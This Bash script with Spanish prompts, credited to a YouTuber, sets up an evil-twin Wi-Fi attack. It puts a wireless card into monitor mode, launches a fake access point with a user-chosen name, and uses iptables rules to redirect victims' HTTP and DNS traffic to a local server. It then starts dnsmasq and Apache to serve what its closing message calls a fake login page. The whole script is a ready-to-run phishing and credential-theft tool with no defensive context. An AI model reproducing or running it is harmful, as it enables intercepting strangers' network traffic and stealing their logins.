#!/bin/bash

# Colours
cafe="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
purpura="\e[0;35m\033[1m"
turquia="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"

if [ "$(id -u)" -ne 0 ]; then
    echo -e "\n${rojo}Ponte en modo root we necesito privilejios maximos${endColour}\n"
    exit 1
fi

echo -e "\n${rojo}Hecho por ErnestoPRO, suscribete a mi canal http://www.youtube.com/@ErnestoPRO-w1z${endColour}\n\n"

Interfacess=$(ip link show | awk -F: '/^[0-9]+: /{print $1 ": " $2}' | sed 's/^[ \t]*//;s/[ \t]*$//')

echo -e "${amarillo}Las interfaces de red disponibles son:${endColour}"
echo -e "$Interfacess"

echo -e "${amarillo}"
read -p "Por favor pon el nombre de tu Interface de red: " InterfaceRed
echo -e "${endColour}"

airmon-ng start $InterfaceRed
if [ $? -ne 0 ]; then
    echo -e "${rojo}Error al poner la interfaz en modo monitor.${endColour}"
    exit 1
fi
echo -e "\n\n${azul}Interface de red puesta en modo monitor${endColour}\n\n"

echo -e "\e[0;33mEscriba como quieres que se llame tu punto de acceso falso: \e[0m"
read NameAP

if [ -z "$NameAP" ]; then
    echo -e "${rojo}El nombre del punto de acceso no puede estar vacío.${endColour}"
    exit 1
fi

echo -e "\e[0;33mAhora dime el canal que deseas utilizar (debe ser del 1 hasta el 12): \e[0m"
read Canal

airbase-ng -e "$NameAP" -c "$Canal" wlan0mon &
sleep 5

echo -e "\n\n${gris}Punto de acceso creado${endColour}\n\n"

# Configurar iptables para redirigir tráfico HTTP y DNS
sudo iptables --table nat --append PREROUTING --protocol tcp --dport 80 --jump DNAT --to-destination 10.0.0.1:80
sudo iptables --table nat --append PREROUTING --protocol udp --dport 53 --jump DNAT --to-destination 10.0.0.1:53
sudo iptables --append FORWARD --in-interface wlan0mon --jump ACCEPT
sudo iptables --table nat --append POSTROUTING --out-interface wlan0 --jump MASQUERADE

# Iniciar dnsmasq y muestro servidor apache
sudo dnsmasq -C /etc/dnsmasq.conf -d &

sudo systemctl start apache2

echo -e "${amarillo}El entorno está listo. Los usuarios que se conecten serán redirigidos a la página de inicio de sesión falsa.${endColour}"
